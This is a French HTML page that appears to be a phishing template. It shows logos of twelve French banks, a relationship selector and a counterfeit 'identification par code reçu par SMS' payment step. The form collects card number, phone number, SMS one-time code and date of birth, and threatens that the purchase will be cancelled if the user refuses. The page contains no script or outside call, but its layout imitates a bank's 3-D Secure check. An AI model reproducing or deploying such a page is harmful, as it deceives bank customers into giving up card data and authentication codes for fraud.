<!doctype html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" href="../public/css/styles.css" type="text/css" />
</head>
<body>
 <div class="container_grid">
 <div class="bank">
     <div class="img_axa"><img class="taille" src="../public/pictures/banks/axa.png"></div>
     <div class="img_bnp"><img class="taille" src="../public/pictures/banks/bnp.png"></div>
     <div class="img_cic"><img class="taille" src="../public/pictures/banks/cic.png"></div>
     <div class="img_bp"><img class="taille" src="../public/pictures/banks/bp.png"></div>
     <div class="img_bpopulaire"><img class="taille" src="../public/pictures/banks/bpopulaire.png"></div>
     <div class="img_boursorama"><img class="taille" src="../public/pictures/banks/boursorama.png"></div>
     <div class="img_ce"><img class="taille" src="../public/pictures/banks/ce.png"></div>
     <div class="img_ca"><img class="taille" src="../public/pictures/banks/ca.png"></div>
     <div class="img_cm"><img class="taille" src="../public/pictures/banks/cm.png"></div>
     <div class="img_lcl"><img class="taille" src="../public/pictures/banks/lcl.png"></div>
     <div class="img_fortuneo"><img class="taille" src="../public/pictures/banks/fortuneo.png"></div>
     <div class="img_hsbc"><img class="taille" src="../public/pictures/banks/hsbc.png"></div>
 </div>
 </div>
 
 <select>
     <option>Affinité</option>
     <option value="1">Père</option>
     <option value="2">Mère</option>
     <option value="3">Beau-Père</option>
     <option value="4">Belle-Mère</option>
     <option value="5">Grand-Père</option>
     <option value="6">Grand-Mère</option>
     <option value="7">Fils</option>
     <option value="8">Fille</option>
     <option value="9">Beau-Fils</option>
     <option value="10">Belle-Fille</option>
     <option value="11">Cousin</option>
     <option value="12">Cousine</option>
     <option value="13">Nièce</option>
     <option value="14">Neveu</option>
     <option value="15">Oncle</option>
     <option value="16">Tante</option>
     <option value="17">Grand-Oncle</option>
     <option value="18">Grand-Tante</option>
     <option value="19">Ami</option>
     <option value="20">Amie</option>
     <option value="21">Petit-Ami</option>
     <option value="22">Petite-Amie</option>
     <option value="23">Collègue</option>
     <option value="24">Employeur</option>
     <option value="25">Anonyme</option>
     <option value="26">Frère</option>
     <option value="27">Soeur</option>
 </select>
 
 <div class="pay">
     <h1 class="title_pay">IDENTIFICATION PAR CODE RECU PAR SMS</h1>
     <img class="visa" src="../public/pictures/site/visa.jpg" alt="visa">
     <h2 class="sub_title_pay">Identification</h2><hr>
     <p>Pour valider votre paiement saisissez le code reçu par SMS sur le téléphone mobile dont les 4 chiffres du numéro sont affichés ci-dessous</p>
     <fieldset class="formulaire_pay">
         <form method="POST" action="" class="form_pay">
             <label for="total_pay"> Montant :</label>
                <input type="text" name="total_pay" id="total_pay" value="" readonly><br>
             <label for="day_pay"> Date :</label>
                <input type="text" name="day_pay" id="day_pay" value="" readonly><br>
             <label for="card_pay"> N° de carte : </label>
                <input type="text" name="card_pay" id="card_pay"><br>
             <label for="tel_pay">Téléphone :</label>
                <input type="tel" name="tel_pay" id="tel_pay"><br>
             <label for="sms_pay">Code d'accès SMS :</label>
                <input type="text" name="sms_pay" id="sms_pay"><br>
             <label for="date_pay">Date de naissance :</label>
                <input type="date" name="date_pay" id="date_pay">
             <input type="submit" class="submit_tel" value="OK">
         </form>   
     </fieldset>
     <p>Cette identification est obligatoire pour conclure votre opération de paiement. Si vous refusez de vous identifier, votre achat sera annulé</p>
     <a href="" class="link_pay">>Je ne peux recevoir de SMS, je souhaite m'identifier avec ma date de naissance.</a>
 </div>
 
 

</body>
</html>